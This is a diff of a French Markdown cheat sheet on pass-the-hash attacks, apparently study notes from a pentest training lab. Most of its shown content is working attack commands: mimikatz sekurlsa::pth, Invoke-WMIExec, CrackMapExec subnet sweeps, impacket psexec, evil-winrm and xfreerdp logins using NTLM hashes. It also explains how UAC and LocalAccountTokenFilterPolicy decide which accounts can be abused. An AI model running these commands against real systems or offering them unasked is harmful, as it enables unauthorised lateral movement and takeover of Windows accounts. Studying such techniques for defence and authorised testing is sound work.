@@ -5,6 +5,7 @@ public: true # set to true to make the article publishable
 ### Mimikatz
 
 On peut créer un processus disposant des identifiants réseau d'un autre utilisateur pour accéder à des ressources réseau en son nom
+
 ```
 # lancer un processus en tant qu'un autre utilisateur (julio) dont on connait le hash
     # on peut remplacer /rc4 par /NTLM
@@ -16,6 +17,7 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 ### Invoke-TheHAsh
 
 On peut également exécuter des commandes à distance en tant qu'un utilisateur dont on possède le Hash (s'il possède les droits requis bien évidemment)
+
 ```powershell
 
 # Powershell avec Invoke-TheHash (https://github.com/Kevin-Robertson/Invoke-TheHash)
@@ -31,6 +33,7 @@ Invoke-WMIExec -Target DC01 -Domain domain.local -Username ad_user -Hash AAAAAAA
 ## A Distance
 
 ### Crackmapexec
+
 ```
 # Tester les machines d'un sous réseau 
 cme smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
@@ -48,11 +51,13 @@ psexec.py Administrator@$TARGET_IP -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 ### Evil-WinRM
+
 ```
 evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 ### Via RDP
+
 Il est nécessaire de désactiver une restriction empêchant de se connecter en RDP en administrateur via du PtH. Pour ce faire :
 
 ```
@@ -70,8 +75,11 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
 
 **Attention**
+
 Seul le compte Administrateur local (RID-500) peut utiliser PtH sur les environnements où l'UAC est actif.
+
 Le paramètre `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`est à `1`, alors tous les compte locaux membre du groupe `Administrateur Local` pourront le faire également (car ils disposeront d'un jeton "Full Integrity")
+
 ** Les comptes utilisateurs du domaine qui sont membres du groupe `Administrateur Local` ne sont dans tous les cas, pas bloqués et peuvent utiliser une attaque de type PtH**
 
 #### Script complet (si execution à distance autorisée)
